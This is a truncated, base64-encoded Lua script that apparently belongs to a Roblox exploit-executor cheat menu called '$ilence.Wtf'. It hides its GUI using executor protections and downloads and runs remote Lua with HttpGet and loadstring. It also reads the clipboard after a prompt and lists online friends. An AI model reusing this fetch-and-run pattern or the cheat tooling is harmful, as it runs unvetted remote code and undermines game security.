tIGV4ZWN1dG9yIHByb3RlY3Rpb25zIChzYWZlIGlmIG5vdCBhdmFpbGFibGUpCnBjYWxsKGZ1bmN0aW9uKCkKICAgIGlmIHN5biBhbmQgc3luLnByb3RlY3RfZ3VpIHRoZW4gc3luLnByb3RlY3RfZ3VpKGd1aSkgZW5kCiAgICBpZiBnZXRfaGlkZGVuX2d1aSBvciBnZXRfaGlkZGVuX3VpIHRoZW4KICAgICAgICAoZ2V0X2hpZGRlbl9ndWkgb3IgZ2V0X2hpZGRlbl91aSkoZ3VpKQogICAgZW5kCmVuZCkKCmd1aS5QYXJlbnQgPSBjb3JlCgpsb2NhbCBzZXJ2aWNlcyA9IHsKICAgICdVc2VySW5wdXRTZXJ2aWNlJywgJ1J1blNlcnZpY2UnLCAnVHdlZW5TZXJ2aWNlJywgJ0NvcmVHdWknLCAnU3RhcnRlckd1aScKfQoKZm9yIF8sIHNlcnZpY2VOYW1lIGluIGlwYWlycyhzZXJ2aWNlcykgZG8KICAgIGdldGdlbnYoKVtzZXJ2aWNlTmFtZV0gPSBnYW1lOkdldFNlcnZpY2Uoc2VydmljZU5hbWUpCmVuZAoKbG9jYWwgdXNlU3R1ZGlvID0gUnVuU2VydmljZTpJc1N0dWRpbygpCgpsb2NhbCBmdW5jdGlvbiBsb2FkV2l0aFRpbWVvdXQodXJsKQogICAgbG9jYWwgc3VjY2VzcywgcmVzdWx0ID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIHJldHVybiBnYW1lOkh0dHBHZXQodXJsLCB0cnVlKQogICAgZW5kKQogICAgaWYgc3VjY2VzcyBhbmQgcmVzdWx0IHRoZW4KICAgICAgICBsb2NhbCBjaHVuayA9IGxvYWRzdHJpbmcocmVzdWx0KQogICAgICAgIGlmIGNodW5rIHRoZW4KICAgICAgICAgICAgcmV0dXJuIGNodW5rKCkKICAgICAgICBlbmQKICAgIGVuZAogICAgd2FybigiRmFpbGVkIHRvIGxvYWQgaWNvbnMgZnJvbSBVUkw6IiwgdXJsKQogICAgcmV0dXJuIHt9CmVuZAoKbG9jYWwgSWNvbnMgPSB1c2VTdHVkaW8KICAgIGFuZCByZXF1aXJlKHNjcmlwdC5QYXJlbnQuaWNvbnMpCiAgICBvciBsb2FkV2l0aFRpbWVvdXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TaXJpdXNTb2Z0d2FyZUx0ZC9SYXlmaWVsZC9yZWZzL2hlYWRzL21haW4vaWNvbnMubHVhJykKCmxvY2FsIGZ1bmN0aW9uIGdldEljb24obmFtZTogc3RyaW5nKQogICAgaWYgbm90IEljb25zIG9yIG5vdCBJY29uc1snNDhweCddIHRoZW4KICAgICAgICB3YXJuKCJMdWNpZGUgSWNvbnM6IEljb25zIGxpYnJhcnkgb3IgNDhweCBzaXplIG5vdCBsb2FkZWQiKQogICAgICAgIHJldHVybiBuaWwKICAgIGVuZAogICAgbmFtZSA9IHN0cmluZy5tYXRjaChzdHJpbmcubG93ZXIobmFtZSksICJeJXMqKC4qKSVzKiQiKSBvciAiIgogICAgbG9jYWwgc2l6ZWRpY29ucyA9IEljb25zWyc0OHB4J10KICAgIGxvY2FsIHIgPSBzaXplZGljb25zW25hbWVdCiAgICBpZiBub3QgciB0aGVuCiAgICAgICAgd2FybigiTHVjaWRlIEljb25zOiBGYWlsZWQgdG8gZmluZCBpY29uIGJ5IHRoZSBuYW1lIG9mICciIC4uIG5hbWUgLi4gIiciKQogICAgICAgIHJldHVybiBuaWwKICAgIGVuZAogICAgbG9jYWwgcmlycyA9IHJbMl0KICAgIGxvY2FsIHJpcm8gPSByWzNdCiAgICBpZiB0eXBlKHJbMV0pIH49ICJudW1iZXIiIG9yIHR5cGUocmlycykgfj0gInRhYmxlIiBvciB0eXBlKHJpcm8pIH49ICJ0YWJsZSIgdGhlbgogICAgICAgIHdhcm4oIkx1Y2lkZSBJY29uczogSW50ZXJuYWwgZXJyb3I6IEludmFsaWQgYXV0by1nZW5lcmF0ZWQgYXNzZXQgZW50cnkiKQogICAgICAgIHJldHVybiBuaWwKICAgIGVuZAogICAgbG9jYWwgaXJzID0gVmVjdG9yMi5uZXcocmlyc1sxXSwgcmlyc1syXSkKICAgIGxvY2FsIGlybyA9IFZlY3RvcjIubmV3KHJpcm9bMV0sIHJpcm9bMl0pCiAgICByZXR1cm4gewogICAgICAgIGlkID0gclsxXSwKICAgICAgICBpbWFnZVJlY3RTaXplID0gaXJzLAogICAgICAgIGltYWdlUmVjdE9mZnNldCA9IGlybywKICAgIH0KZW5kCgpsb2NhbCBmdW5jdGlvbiBnZXRBc3NldFVyaShpZCkKICAgIGlmIHR5cGUoaWQpID09ICJudW1iZXIiIHRoZW4KICAgICAgICByZXR1cm4gInJieGFzc2V0aWQ6Ly8iIC4uIGlkCiAgICBlbHNlCiAgICAgICAgd2FybigiUmF5ZmllbGQgfCBUaGUgaWNvbiBhcmd1bWVudCBtdXN0IGJlIGEgbnVtZXJpYyBhc3NldCBJRCIpCiAgICAgICAgcmV0dXJuICJyYnhhc3NldGlkOi8vMCIKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIGNyZWF0ZUljb25CdXR0b24oaWNvbk5hbWUsIHBhcmVudCkKICAgIGxvY2FsIGljb25EYXRhID0gZ2V0SWNvbihpY29uTmFtZSkKICAgIGlmIG5vdCBpY29uRGF0YSB0aGVuCiAgICAgICAgd2FybigiQ2Fubm90IGNyZWF0ZSBpY29uIGJ1dHRvbiwgaWNvbiBub3QgZm91bmQ6ICIgLi4gdG9zdHJpbmcoaWNvbk5hbWUpKQogICAgICAgIHJldHVybiBuaWwKICAgIGVuZAogICAgbG9jYWwgYnV0dG9uID0gSW5zdGFuY2UubmV3KCJJbWFnZUJ1dHRvbiIpCiAgICBidXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLCAyMCwgMCwgMjApCiAgICBidXR0b24uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIGJ1dHRvbi5JbWFnZSA9IGdldEFzc2V0VXJpKGljb25EYXRhLmlkKQogICAgYnV0dG9uLkltYWdlUmVjdFNpemUgPSBpY29uRGF0YS5pbWFnZVJlY3RTaXplCiAgICBidXR0b24uSW1hZ2VSZWN0T2Zmc2V0ID0gaWNvbkRhdGEuaW1hZ2VSZWN0T2Zmc2V0CiAgICBidXR0b24uUGFyZW50ID0gcGFyZW50CiAgICBidXR0b24uWkluZGV4ID0gcGFyZW50LlpJbmRleCArIDEKICAgIHJldHVybiBidXR0b24KZW5kCgpOb3RpZmljYXRpb25MaWIuTm90aWZ5KHsKICAgIFRpdGxlID0gIkFjdGlvbiBSZXF1aXJlZCEiLAogICAgQ29udGVudCA9ICJBbGxvdyBVcyBUbyBBY2Nlc3MgWW91ciBDbGlwYm9hcmQ/IiwKICAgIEJ1dHRvbjEgPSB0cnVlLAogICAgQnV0dG9uMVRleHQgPSAiWWVzIiwKICAgIEJ1dHRvbjFDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBjbGlwYm9hcmRDb250ZW50ID0gIltnZXRjbGlwYm9hcmQgbm90IHN1cHBvcnRlZF1cblJlc3VsdGluZyBGaXghIgogICAgICAgIGlmIHR5cGUoZ2V0Y2xpcGJvYXJkKSA9PSAiZnVuY3Rpb24iIHRoZW4KICAgICAgICAgICAgbG9jYWwgc3VjY2VzcywgcmVzdWx0ID0gcGNhbGwoZ2V0Y2xpcGJvYXJkKQogICAgICAgICAgICBpZiBzdWNjZXNzIGFuZCB0eXBlKHJlc3VsdCkgPT0gInN0cmluZyIgdGhlbgogICAgICAgICAgICAgICAgY2xpcGJvYXJkQ29udGVudCA9IHJlc3VsdAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBjbGlwYm9hcmRDb250ZW50ID0gIltGYWlsZWQgdG8gcmVhZCBjbGlwYm9hcmRdIgogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgTm90aWZpY2F0aW9uTGliLk5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIkNsaXBib2FyZCBDb250ZW50IiwKICAgICAgICAgICAgQ29udGVudCA9ICJDbGlwYm9hcmQgY29udGVudHM6XG4iIC4uIGNsaXBib2FyZENvbnRlbnQsCiAgICAgICAgICAgIER1cmF0aW9uID0gNQogICAgICAgIH0pCiAgICBlbmQsCiAgICBCdXR0b24yID0gdHJ1ZSwKICAgIEJ1dHRvbjJUZXh0ID0gIk5vIiwKICAgIEJ1dHRvbjJDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBOb3RpZmljYXRpb25MaWIuTm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiQWNjZXNzIERlbmllZCIsCiAgICAgICAgICAgIENvbnRlbnQgPSAiWW91IGNob3NlIG5vdCB0byBhbGxvdyBjbGlwYm9hcmQgYWNjZXNzLiIsCiAgICAgICAgICAgIER1cmF0aW9uID0gNAogICAgICAgIH0pCiAgICBlbmQKfSkKCk5vdGlmaWNhdGlvbkxpYi5Ob3RpZnkoewogICAgVGl0bGUgPSAiU3VjY2VzZnVsbHkgTGF1bmNoZWQhIiwKICAgIENvbnRlbnQgPSAiJGlsZW5jZS5XdGYgaGFzIGJlZW4gc3VjY2VzZnVsbHkgbGF1bmNoZWQhIiwKICAgIER1cmF0aW9uID0gNgp9KQoKCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKCi0tIEZ1bmN0aW9uIHRvIGdldCBhbGwgZnJpZW5kcwpsb2NhbCBmdW5jdGlvbiBnZXRBbGxGcmllbmRzKCkKICAgIGxvY2FsIHBhZ2VzID0gUGxheWVyczpHZXRGcmllbmRzQXN5bmMoKQogICAgbG9jYWwgYWxsRnJpZW5kcyA9IHt9CgogICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgIGZvciBfLCBmcmllbmQgaW4gaXBhaXJzKHBhZ2VzOkdldEN1cnJlbnRQYWdlKCkpIGRvCiAgICAgICAgICAgIHRhYmxlLmluc2VydChhbGxGcmllbmRzLCBmcmllbmQpCiAgICAgICAgZW5kCgogICAgICAgIGlmIHBhZ2VzLklzRmluaXNoZWQgdGhlbiBicmVhayBlbmQKICAgICAgICBwYWdlczpBZHZhbmNlVG9OZXh0UGFnZUFzeW5jKCkKICAgIGVuZAoKICAgIHJldHVybiBhbGxGcmllbmRzCmVuZAoKLS0gUnVuIHRoZSBmdW5jdGlvbiBhbmQgZmlsdGVyIHdob+KAmXMgb25saW5lCmxvY2FsIHN1Y2Nlc3MsIHJlc3VsdCA9IHBjYWxsKGdldEFsbEZyaWVuZHMpCgppZiBzdWNjZXNzIHRoZW4KICAgIGxvY2FsIG9ubGluZSA9IHt9CgogICAgZm9yIF8sIGZyaWVuZCBpbiBpcGFpcnMocmVzdWx0KSBkbwogICAgICAgIGlmIGZyaWVuZC5Jc09ubGluZSB0aGVuCiAgICAgICAgICAgIHRhYmxlLmluc2VydChvbmxpbmUsIGZyaWVuZC5Vc2VybmFtZSkKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGxvY2FsIGNvbnRlbnQgPSAiIgogICAgaWYgI29ubGluZSA+IDAgdGhlbgogICAgICAgIGNvbnRlbnQgPSAiT25saW5lIEZyaWVuZHM6XG4iIC4uIHRhYmxlLmNvbmNhdChvbmxpbmUsICIsICIpCiAgICBlbHNlCiAgICAgICAgY29udGVudCA9ICJObyBmcmllbmRzIGFyZSBjdXJyZW50bHkgb25saW5lLiIKICAgIGVuZAoKICAgIC0tIFNob3cgaW4gTm90aWZpY2F0aW9uTGliCiAgICBOb3RpZmljYXRpb25MaWIuTm90aWZ5KHsKICAgICAgICBUaXRsZSA9ICJTdWNjZXNzZnVsbHkgTGF1bmNoZWQhIiwKICAgICAgICBDb250ZW50ID0gY29udGVudCwKICAgICAgICBEdXJhdGlvbiA9IDgKICAgIH0pCmVsc2UKICAgIE5vdGlmaWNhdGlvbkxpYi5Ob3RpZnkoewogICAgICAgIFRpdGxlID0gIkVycm9yIiwKICAgICAgICBDb250ZW50ID0gIkZhaWxlZCB0byBsb2FkIGZyaWVuZHMgbGlzdC4iLAogICAgICAgIER1cmF0aW9uID0gNQogICAgfSkKZW5kCgpsb2NhbCBmcmFtZSA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiKQpmcmFtZS5OYW1lID0gIiRpbGVuY2UuV3RmIgpmcmFtZS5TaXplID0gVURpbTIubmV3KDAsIDYwMCwgMCwgNDAwKQpmcmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIC0zMDAsIDAuNSwgLTIwMCkKZnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCmZyYW1lLkJvcmRlclNpemVQaXhlbCA9IDAKZnJhbWUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAKZnJhbWUuQ2xpcHNEZXNjZW5kYW50cyA9IHRydWUKZnJhbWUuU2Nyb2xsQmFyVGhpY2tuZXNzID0gMgpmcmFtZS5TY3JvbGxCYXJJbWFnZUNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCmZyYW1lLlNjcm9sbEJhckltYWdlVHJhbnNwYXJlbmN5ID0gMC4yCmZyYW1lLlNjcm9sbGluZ0RpcmVjdGlvbiA9IEVudW0uU2Nyb2xsaW5nRGlyZWN0aW9uLlkKZnJhbWUuQ2FudmFzU2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAwLCAxMjAwKQpmcmFtZS5QYXJlbnQgPSBndWkKCmxvY2FsIHN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKQpzdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQpzdHJva2UuVGhpY2tuZXNzID0gMQpzdHJva2UuVHJhbnNwYXJlbmN5ID0gMC43CnN0cm9rZS5QYXJlbnQgPSBmcmFtZQoKbG9jYWwgY29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCmNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA2KQpjb3JuZXIuUGFyZW50ID0gZnJhbWUKCmxvY2FsIGRyYWdCYXIgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKZHJhZ0Jhci5TaXplID0gVURpbTIubmV3KDAsIDUwMCwgMCwgMzApCmRyYWdCYXIuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDEpCmRyYWdCYXIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCmRyYWdCYXIuQm9yZGVyU2l6ZVBpeGVsID0gMApkcmFnQmFyLlpJbmRleCA9IGZyYW1lLlpJbmRleCArIDEKZHJhZ0Jhci5QYXJlbnQgPSBndWkKCmxvY2FsIERjb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKRGNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KQpEY29ybmVyLlBhcmVudCA9IGRyYWdCYXIKCmxvY2FsIEdBUCA9IDUKCmxvY2FsIGZ1bmN0aW9uIHVwZGF0ZURyYWdCYXIoKQogICAgZHJhZ0Jhci5Qb3NpdGlvbiA9IFVEaW0yLm5ldygKICAgICAgICBmcmFtZS5Qb3NpdGlvbi5YLlNjYWxlLAogICAgICAgIGZyYW1lLlBvc2l0aW9uLlguT2Zmc2V0ICsgZnJhbWUuU2l6ZS5YLk9mZnNldCAvIDIsCiAgICAgICAgZnJhbWUuUG9zaXRpb24uWS5TY2FsZSwKICAgICAgICBmcmFtZS5Qb3NpdGlvbi5ZLk9mZnNldCAtIEdBUAogICAgKQplbmQKCnVwZGF0ZURyYWdCYXIoKQpSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6Q29ubmVjdCh1cGRhdGVEcmFnQmFyKQoKbG9jYWwgc3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpCnN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCnN0cm9rZS5UaGlja25lc3MgPSAxCnN0cm9rZS5UcmFuc3BhcmVuY3kgPSAwLjcKc3Ryb2tlLlBhcmVudCA9IGRyYWdCYXIKCmxvY2FsIGRyYWdCYXJDb3NtZXRpYyA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQpkcmFnQmFyQ29zbWV0aWMuU2l6ZSA9IFVEaW0yLm5ldygwLCAxMDAsIDAsIDQpCmRyYWdCYXJDb3NtZXRpYy5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgLTIpCmRyYWdCYXJDb3NtZXRpYy5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMC41KQpkcmFnQmFyQ29zbWV0aWMuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDk2LCAxNjgsIDIyNikKZHJhZ0JhckNvc21ldGljLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCmRyYWdCYXJDb3NtZXRpYy5Cb3JkZXJTaXplUGl4ZWwgPSAwCmRyYWdCYXJDb3NtZXRpYy5QYXJlbnQgPSBkcmFnQmFyCgpsb2NhbCBkcmFnQmFyQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCmRyYWdCYXJDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMSwgMCkKZHJhZ0JhckNvcm5lci5QYXJlbnQgPSBkcmFnQmFyQ29zbWV0aWMKCmxvY2FsIHRpdGxlTGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCnRpdGxlTGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygwLCA5MCwgMCwgMjApCnRpdGxlTGFiZWwuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMjA4LCAwLjUsIDApCnRpdGxlTGFiZWwuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLCAwLjUpCnRpdGxlTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKdGl0bGVMYWJlbC5UZXh0ID0gInNpbGVuY2Uud3RmIgp0aXRsZUxhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQp0aXRsZUxhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAp0aXRsZUxhYmVsLlRleHRTaXplID0gMTYKdGl0bGVMYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuQ2VudGVyCnRpdGxlTGFiZWwuWkluZGV4ID0gZHJhZ0Jhci5aSW5kZXggKyAxCnRpdGxlTGFiZWwuUGFyZW50ID0gZHJhZ0JhcgoKbG9jYWwgdGl0bGVMYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKdGl0bGVMYWJlbC5TaXplID0gVURpbTIubmV3KDAsIDkwLCAwLCAyMCkKdGl0bGVMYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAxODAsIDAuNTUsIDApCnRpdGxlTGFiZWwuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLCAwLjUpCnRpdGxlTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKdGl0bGVMYWJlbC5UZXh0ID0gInYxLjAuMSIKdGl0bGVMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDIwMCkKdGl0bGVMYWJlbC5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnNCb2xkCnRpdGxlTGFiZWwuVGV4dFNpemUgPSAxMwp0aXRsZUxhYmVsLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CnRpdGxlTGFiZWwuWkluZGV4ID0gZHJhZ0Jhci5aSW5kZXggKyAxCnRpdGxlTGFiZWwuUGFyZW50ID0gZHJhZ0JhcgoKbG9jYWwgZHJhZ2dpbmcgPSBmYWxzZQpsb2NhbCBkcmFnU3RhcnQgPSBuaWwKbG9jYWwgc3RhcnRQb3MgPSBuaWwKbG9jYWwgdGFyZ2V0UG9zaXRpb24gPSBuaWwKbG9jYWwgY3VycmVudFBvc2l0aW9uID0gbmlsCgpsb2NhbCBmdW5jdGlvbiBjbGFtcFBvc2l0aW9uKHBvcywgZnJhbWVTaXplLCBndWlTaXplKQoKICAgIGxvY2FsIGFic1ggPSBwb3MuWC5TY2FsZSAqIGd1aVNpemUuWCArIHBvcy5YLk9mZnNldAogICAgbG9jYWwgYWJzWSA9IHBvcy5ZLlNjYWxlICogZ3VpU2l6ZS5ZICsgcG9zLlkuT2Zmc2V0CgogICAgbG9jYWwgY2xhbXBlZFggPSBtYXRoLmNsYW1wKGFic1gsIDAsIGd1aVNpemUuWCAtIGZyYW1lU2l6ZS5YKQogICAgbG9jYWwgY2xhbXBlZFkgPSBtYXRoLmNsYW1wKGFic1ksIDAsIGd1aVNpemUuWSAtIGZyYW1lU2l6ZS5ZKQoKICAgIHJldHVybiBVRGltMi5uZXcoMCwgY2xhbXBlZFgsIDAsIGNsYW1wZWRZKQplbmQKClJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKGR0KQogICAgaWYgdGFyZ2V0UG9zaXRpb24gYW5kIGN1cnJlbnRQb3NpdGlvbiB0aGVuCiAgICAgICAgY3VycmVudFBvc2l0aW9uID0gY3VycmVudFBvc2l0aW9uOkxlcnAodGFyZ2V0UG9zaXRpb24sIG1hdGgubWluKGR0ICogMTUsIDEpKQogICAgICAgIGZyYW1lLlBvc2l0aW9uID0gY3VycmVudFBvc2l0aW9uCiAgICBlbmQKZW5kKQoKZHJhZ0Jhci5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjEgdGhlbgogICAgICAgIGRyYWdnaW5nID0gdHJ1ZQogICAgICAgIGRyYWdTdGFydCA9IGlucHV0LlBvc2l0aW9uCiAgICAgICAgc3RhcnRQb3MgPSBmcmFtZS5Qb3NpdGlvbgogICAgICAgIGN1cnJlbnRQb3NpdGlvbiA9IHN0YXJ0UG9zCiAgICAgICAgdGFyZ2V0UG9zaXRpb24gPSBzdGFydFBvcwogICAgICAgIGlucHV0LkNoYW5nZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFN0YXRlID09IEVudW0uVXNlcklucHV0U3RhdGUuRW5kIHRoZW4KICAgICAgICAgICAgICAgIGRyYWdnaW5nID0gZmFsc2UKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCmVuZCkKCmRyYWdCYXIuSW5wdXRDaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZU1vdmVtZW50IHRoZW4KICAgICAgICBkcmFnSW5wdXQgPSBpbnB1dAogICAgZW5kCmVuZCkKClVzZXJJbnB1dFNlcnZpY2UuSW5wdXRDaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICBpZiBkcmFnZ2luZyBhbmQgaW5wdXQgPT0gZHJhZ0lucHV0IHRoZW4KICAgICAgICBsb2NhbCBkZWx0YSA9IGlucHV0LlBvc2l0aW9uIC0gZHJhZ1N0YXJ0CiAgICAgICAgbG9jYWwgbmV3UG9zID0gVURpbTIubmV3KAogICAgICAgICAgICBzdGFydFBvcy5YLlNjYWxlLAogICAgICAgICAgICBzdGFydFBvcy5YLk9mZnNldCArIGRlbHRhLlgsCiAgICAgICAgICAgIHN0YXJ0UG9zLlkuU2NhbGUsCiAgICAgICAgICAgIHN0YXJ0UG9zLlkuT2Zmc2V0ICsgZGVsdGEuWQogICAgICAgICkKCiAgICAgICAgdGFyZ2V0UG9zaXRpb24gPSBjbGFtcFBvc2l0aW9uKG5ld1BvcywgZnJhbWUuQWJzb2x1dGVTaXplLCBndWkuQWJzb2x1dGVTaXplKQogICAgZW5kCmVuZCkKCmxvY2FsIHRvZ2dsZXMgPSB7fQoKbG9jYWwgaXNNaW5pbWl6ZWQgPSBmYWxzZQoKbG9jYWwgbWluaW1pemVCdXR0b24gPSBjcmVhdGVJY29uQnV0dG9uKCJtaW51cyIsIGRyYWdCYXIpCmlmIG1pbmltaXplQnV0dG9uIHRoZW4KICAgIG1pbmltaXplQnV0dG9uLlBvc2l0aW9uID0gVURpbTIubmV3KDEsIC0zNSwgMC41LCAwKQogICAgbWluaW1pemVCdXR0b24uQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDAuNSkKICAgIG1pbmltaXplQnV0dG9uLlpJbmRleCA9IGRyYWdCYXIuWkluZGV4ICsgMQoKICAgIGxvY2FsIGNsaWNrU291bmQgPSBJbnN0YW5jZS5uZXcoIlNvdW5kIikKICAgIGNsaWNrU291bmQuU291bmRJZCA9ICJyYnhhc3NldGlkOi8vMTU2NzUwNTkzMjMiCiAgICBjbGlja1NvdW5kLlZvbHVtZSA9IDAuMwogICAgY2xpY2tTb3VuZC5QYXJlbnQgPSBtaW5pbWl6ZUJ1dHRvbgogICAgbWluaW1pemVCdXR0b24uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCgogICAgICAgIGNsaWNrU291bmQ6UGxheSgpCiAgICAgICAgaXNNaW5pbWl6ZWQgPSBub3QgaXNNaW5pbWl6ZWQKICAgICAgICBmcmFtZS5WaXNpYmxlID0gbm90IGlzTWluaW1pemVkCiAgICBlbmQpCmVuZAoKbG9jYWwgY2xvc2VCdXR0b24gPSBjcmVhdGVJY29uQnV0dG9uKCJ4IiwgZHJhZ0JhcikKaWYgY2xvc2VCdXR0b24gdGhlbgogICAgY2xvc2VCdXR0b24uUG9zaXRpb24gPSBVRGltMi5uZXcoMSwgLTE1LCAwLjUsIDApCiAgICBjbG9zZUJ1dHRvbi5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMC41KQogICAgY2xvc2VCdXR0b24uWkluZGV4ID0gZHJhZ0Jhci5aSW5kZXggKyAxCgogICAgbG9jYWwgY2xpY2tTb3VuZCA9IEluc3RhbmNlLm5ldygiU291bmQiKQogICAgY2xpY2tTb3VuZC5Tb3VuZElkID0gInJieGFzc2V0aWQ6Ly8xNTY3NTA1OTMyMyIKICAgIGNsaWNrU291bmQuVm9sdW1lID0gMC4zCiAgICBjbGlja1NvdW5kLlBhcmVudCA9IGNsb3NlQnV0dG9uCiAgICBjbG9zZUJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBjbGlja1NvdW5kOlBsYXkoKQoKICAgICAgICBmb3IgXywgdG9nZ2xlIGluIGlwYWlycyh0b2dnbGVzKSBkbwogICAgICAgICAgICBpZiB0b2dnbGUub3B0aW9ucy5DdXJyZW50VmFsdWUgdGhlbgogICAgICAgICAgICAgICAgdG9nZ2xlLm9wdGlvbnMuQ3VycmVudFZhbHVlID0gZmFsc2UKICAgICAgICAgICAgICAgIGxvY2FsIGtub2IgPSB0b2dnbGUuZnJhbWU6RmluZEZpcnN0Q2hpbGQoIkZyYW1lIik6RmluZEZpcnN0Q2hpbGQoIkZyYW1lIikKICAgICAgICAgICAgICAgIGlmIGtub2IgdGhlbgogICAgICAgICAgICAgICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoa25vYiwgVHdlZW5JbmZvLm5ldygwLjE1LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMiwgMC40OSwgMCkKICAgICAgICAgICAgICAgICAgICB9KTpQbGF5KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgdHlwZW9mKHRvZ2dsZS5vcHRpb25zLkNhbGxiYWNrKSA9PSAiZnVuY3Rpb24iIHRoZW4KICAgICAgICAgICAgICAgICAgICB0b2dnbGUub3B0aW9ucy5DYWxsYmFjayhmYWxzZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICBndWk6RGVzdHJveSgpCiAgICBlbmQpCmVuZAoKbG9jYWwgc3RhckhvbGRlciA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQpzdGFySG9sZGVyLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKc3RhckhvbGRlci5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQpzdGFySG9sZGVyLlpJbmRleCA9IDEKc3RhckhvbGRlci5DbGlwc0Rlc2NlbmRhbnRzID0gdHJ1ZQpzdGFySG9sZGVyLlBhcmVudCA9IGZyYW1lCgpjb3JvdXRpbmUud3JhcChmdW5jdGlvbigpCiAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgbG9jYWwgc